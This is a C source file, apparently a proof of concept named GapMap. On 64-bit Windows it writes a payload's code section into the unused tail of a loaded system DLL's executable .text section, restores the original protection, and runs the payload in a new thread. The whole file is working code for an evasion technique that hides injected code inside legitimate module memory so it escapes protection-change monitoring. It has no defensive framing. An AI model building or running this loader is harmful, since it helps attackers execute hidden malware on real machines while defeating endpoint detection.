/*
 * gapmap.c - GapMap: Section-Gap Payload Mapping PoC
 *
 * Maps a PIC payload into the alignment gap at the tail of a loaded
 * system DLL's .text section. The gap is already PAGE_EXECUTE_READ,
 * no protection change persists.
 *
 * 64-bit Windows only.
 */

#include <windows.h>
#include <stdio.h>

/* ---------- gap finder ---------- */

typedef struct {
    const char *dll;
    BYTE       *addr;
    SIZE_T      size;
    HMODULE     hmod;
} GapInfo;

static GapInfo find_best_text_gap(const char **dlls)
{
    GapInfo best = {0};

    for (int i = 0; dlls[i]; i++) {
        HMODULE hmod = LoadLibraryA(dlls[i]);
        if (!hmod) continue;

        IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)hmod;
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) { FreeLibrary(hmod); continue; }
        IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)((BYTE *)hmod + dos->e_lfanew);
        IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
        WORD n = nt->FileHeader.NumberOfSections;

        for (WORD j = 0; j < n - 1; j++) {
            if (!(sec[j].Characteristics & (IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE)))
                continue;

            DWORD end  = sec[j].VirtualAddress + sec[j].Misc.VirtualSize;
            DWORD next = sec[j + 1].VirtualAddress;
            if (next <= end) continue;

            SIZE_T gap = next - end;
            if (gap > best.size) {
                best.dll  = dlls[i];
                best.addr = (BYTE *)hmod + end;
                best.size = gap;
                best.hmod = hmod;
            }
        }

        if (best.hmod != hmod) FreeLibrary(hmod);
    }

    return best;
}

/* ---------- payload loader ---------- */

static BYTE *load_payload(const char *path, SIZE_T *out_size, DWORD *out_entry_off)
{
    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return NULL;

    DWORD fsz = GetFileSize(hf, NULL);
    if (fsz == INVALID_FILE_SIZE || fsz < sizeof(IMAGE_DOS_HEADER)) {
        CloseHandle(hf);
        return NULL;
    }

    BYTE *fbuf = VirtualAlloc(NULL, fsz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!fbuf) { CloseHandle(hf); return NULL; }

    DWORD rd;
    if (!ReadFile(hf, fbuf, fsz, &rd, NULL) || rd != fsz) {
        CloseHandle(hf);
        VirtualFree(fbuf, 0, MEM_RELEASE);
        return NULL;
    }
    CloseHandle(hf);

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)fbuf;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) goto fail;
    if (dos->e_lfanew < 0 || (DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS) > fsz)
        goto fail;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(fbuf + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_CNT_CODE) {
            DWORD entry_rva = nt->OptionalHeader.AddressOfEntryPoint;
            if (entry_rva < sec[i].VirtualAddress) goto fail;

            SIZE_T sz = sec[i].SizeOfRawData;
            BYTE *blob = VirtualAlloc(NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!blob) goto fail;

            memcpy(blob, fbuf + sec[i].PointerToRawData, sz);
            *out_size = sz;
            *out_entry_off = entry_rva - sec[i].VirtualAddress;
            VirtualFree(fbuf, 0, MEM_RELEASE);
            return blob;
        }
    }

fail:
    VirtualFree(fbuf, 0, MEM_RELEASE);
    return NULL;
}

/* ---------- main ---------- */

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("=== GapMap - Section-Gap Payload Mapping PoC ===\n\n");

    const char *candidates[] = {
        "crypt32.dll", "dwmapi.dll", "normaliz.dll", "bcrypt.dll",
        "clbcatq.dll", "ucrtbase.dll", "urlmon.dll", "shlwapi.dll",
        "uxtheme.dll", "dxgi.dll", "user32.dll", "gdi32.dll",
        "advapi32.dll", "kernelbase.dll", "ntdll.dll",
        NULL
    };

    GapInfo gap = find_best_text_gap(candidates);
    if (!gap.addr || gap.size < 64) {
        printf("[!] no usable .text gap found\n");
        return 1;
    }
    printf("[+] best gap: %s at %p (%llu bytes)\n",
           gap.dll, (void *)gap.addr, (unsigned long long)gap.size);

    DWORD entry_off;
    SIZE_T payload_size;
    BYTE *payload = load_payload("payload.exe", &payload_size, &entry_off);
    if (!payload) { printf("[!] payload load failed\n"); return 1; }
    printf("[+] payload: %llu bytes, entry+0x%lx\n",
           (unsigned long long)payload_size, (unsigned long)entry_off);

    if (payload_size > gap.size) {
        printf("[!] payload (%llu) exceeds gap (%llu)\n",
               (unsigned long long)payload_size, (unsigned long long)gap.size);
        return 1;
    }

    /* brief RW flip to write payload, then restore original protection */
    DWORD old_prot;
    VirtualProtect(gap.addr, payload_size, PAGE_READWRITE, &old_prot);
    memcpy(gap.addr, payload, payload_size);
    VirtualProtect(gap.addr, payload_size, old_prot, &old_prot);
    printf("[+] payload written, protection restored\n");

    BYTE *entry = gap.addr + entry_off;
    printf("[*] launching at %p\n", (void *)entry);
    HANDLE ht = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entry, NULL, 0, NULL);
    if (!ht) { printf("[!] CreateThread: %lu\n", GetLastError()); return 1; }

    Sleep(2000);
    DWORD ec;
    GetExitCodeThread(ht, &ec);
    printf("[+] payload: %s\n", ec == STILL_ACTIVE ? "RUNNING" : "DEAD");

    HANDLE evt = OpenEventA(EVENT_ALL_ACCESS, FALSE, "GapMapAlive");
    if (evt) {
        printf("[+] GapMapAlive signaled\n");
        CloseHandle(evt);
    } else {
        printf("[!] event not found (%lu)\n", GetLastError());
    }

    printf("\n=== GapMap active ===\n");
    printf("  %s .text gap at %p\n", gap.dll, (void *)gap.addr);
    printf("  %llu / %llu bytes used\n",
           (unsigned long long)payload_size, (unsigned long long)gap.size);
    printf("\n[*] Enter to exit\n");
    getchar();

    TerminateThread(ht, 0);
    WaitForSingleObject(ht, 1000);
    CloseHandle(ht);

    VirtualProtect(gap.addr, payload_size, PAGE_READWRITE, &old_prot);
    memset(gap.addr, 0, payload_size);
    VirtualProtect(gap.addr, payload_size, old_prot, &old_prot);

    VirtualFree(payload, 0, MEM_RELEASE);
    return 0;
}
